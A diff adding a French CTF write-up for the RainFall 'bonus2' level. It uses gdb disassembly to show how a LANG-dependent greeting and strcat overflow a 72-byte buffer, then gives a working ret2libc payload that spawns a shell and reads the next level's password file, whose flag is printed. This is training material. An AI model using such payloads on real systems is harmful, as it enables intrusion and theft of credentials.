@@ -1,0 +1,117 @@
+bffff670#BONUS 2
+
+Le binaire ne fais rien quand on lui on envoi un argument,
+il nous print "Hello" + le 1er argument quand il en recoit 2.
+
+2 arguments attendu, si ce n'est pas le cas on jump a la fin du programme
+   0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)
+   0x0804853c <+19>:	je     0x8048548 <main+31>
+
+Avant l'appel au premier strncpy, les 3 variables que l'on voit sur le haut de
+la stack donc envoye a la fonction strncpy sont:
+   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
+(gdb) x/4wx $esp
+0xbffff620:	0xbffff670	0xbffff8c8	0x00000028	0xb7fff918
+		    |   ""   | | argv[1]  || size 0x28 |
+
+40 octets de notre argv[1] sont donc copie.
+
+
+Avant l'appel au deuxieme strncpy, les 3 variables sont cette fois:
+    0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
+(gdb) x/4wx $esp
+0xbffff620:	0xbffff698	0xbffff8ce	0x00000020	0xb7fff918
+		    |   ""   | | argv[2]  || size 0x20 |
+
+32 octets de notre argv[2] sont donc copie.
+Nous notons aussi que nos deux adresses sont distante de 0x28 soit 40 l'une
+de l'autre.
+
+Recuperation de l'adresse de la variable d'environnement LANG.
+   0x0804859f <+118>:	movl   $0x8048738,(%esp)		<== LANG
+   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>	<== getenv
+   0x080485ab <+130>:	mov    %eax,0x9c(%esp)			<== le retour de getenv dans eax contient la string de notre var d'env.
+   0x080485ab <+130>:	mov    %eax,0x9c(%esp)
+   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)			<== si le retour de getenv est NULL on jump
+   0x080485ba <+145>:	je     0x8048618 <main+239>		<== jump if equal, cmp entre 0 et notre string.
+
+
+Les 3 arguments pour memcmp sont push:
+   0x080485bc <+147>:	movl   $0x2,0x8(%esp)			<== la size_t de 2
+   0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)		<== la string "fi"
+   0x080485cc <+163>:	mov    0x9c(%esp),%eax
+   0x080485d3 <+170>:	mov    %eax,(%esp)				<== la string de notre var d'env
+   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
+
+Les 3 arguments push pour memcp :
+   0x080485eb <+194>:	movl   $0x2,0x8(%esp)			<== la size_t de 2
+   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)		<== la string "nl"
+   0x080485fb <+210>:	mov    0x9c(%esp),%eax
+   0x08048602 <+217>:	mov    %eax,(%esp)				<== la string de notre var d'env
+=> 0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
+
+La variable d'environnement correspond a la langue, fi pour finnois, nl pour le neerlandais..
+
+bonus2@RainFall:~$ ./bonus2 choco vanille
+Goedemiddag! choco
+bonus2@RainFall:~$ export LANG=fi
+bonus2@RainFall:~$ ./bonus2 choco vanille
+Hyvää päivää choco
+
+A cette adresse nous avons la langue stocke, 0 pour anglais,  1 pour fi, et 2 pour nl
+(gdb) x 0x8049988
+0x8049988 <language>:	0x00000000
+
+<greetuser>
+En ce qui concerne la fonction greetuser, en fonction du flag qui a ete set
+par rapport a la variable <language>, un message de bienvenu sera concatener
+avec la copie de notre argv[1] dans un buffer de 72 octects.
+
+   0x08048511 <+141>:	lea    -0x48(%ebp),%eax			<== size buffer
+
+Voila sans plus rentrer dans les details ce qu'effectue le binaire.
+Parlons desormais de la faille, qui se situe dans le bufferoverflow exploitable
+grace a strcat qui n'effectue aucune verification de la size des chaines
+avant de concatener celles-ci.
+Bien qu'un strncpy sur le malloc a essayer de controler en amont la size de ces
+chaines (40 octets pour la premiere, puis 32 pour la 2eme), le fait que les
+deux adresses soient separer de 40 octets dans la memoire nous permet de faire
+suivre ces deux chaines sans \0 entre elles et donc de concatener le message de
+bienvenue a une chaine bien plus longue que les 40 octets prevu, le but va etre
+de reecrire l'eip pour le rediriger la ou nous le souhaitons.
+
+Dans un premier temps nous avons essayer, mais nous avons remarquer qu'avec
+la variable d'environemment de base nous ne parvenions pas a reecrire
+entierement l'EIP.
+
+(gdb) run $(python -c 'print "A"*40') BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08004242 in ?? ()
+
+| Deuxieme test:|
+
+bonus2@RainFall:~$ export LANG=fi
+
+(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+
+Nous avons bien l'EIP entierement reecrite, nous en profitons pour recuperer
+l'offset de 18 octets.
+Nous allons utilise, comme d'habitude, la return2libc qui fera notre call a
+system avec /bin/sh.
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*18 + "\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+Gogogo.. Power Rangers..
